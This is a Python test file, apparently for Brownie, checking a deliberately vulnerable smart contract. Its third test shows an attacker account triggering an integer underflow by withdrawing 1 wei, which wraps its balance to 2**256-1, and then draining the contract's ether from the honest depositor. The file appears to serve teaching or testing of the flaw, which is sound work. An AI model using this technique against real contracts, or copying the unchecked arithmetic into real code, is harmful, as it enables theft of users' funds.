def test_initial_values(underflow, accounts):
    assert underflow.balances(accounts[0]) == 0
    assert underflow.balances(accounts[1]) == 0

def test_deposit(underflow, accounts):
    underflow.deposit({'from': accounts[0], 'value': 1e18})
    assert underflow.balances(accounts[0]) == 1e18
    assert underflow.balances(accounts[1]) == 0

def test_underflow(underflow, accounts):
    attacker_wallet_before = accounts[1].balance()
    # assert contract balances before the attack
    assert underflow.balances(accounts[0]) == 1e18
    assert underflow.balances(accounts[1]) == 0
    # assert contract's own eth balance before the attack
    assert underflow.balance() == 1e18

    # attacker causes an underflow
    underflow.withdraw(1, {'from': accounts[1]})
    ## 2**256 - 1
    assert underflow.balances(accounts[1]) == 115792089237316195423570985008687907853269984665640564039457584007913129639935
    assert underflow.balance() == 999999999999999999
    assert underflow.balances(accounts[0]) == 1e18

    # attacker exploits the underflow to drain the contract
    underflow.withdraw(999999999999999999, {'from': accounts[1]})
    assert accounts[1].balance() == attacker_wallet_before + 1e18
    assert underflow.balance() == 0
    # the contract balance of the other legitimate holders has not been updated
    assert underflow.balances(accounts[0]) == 1e18



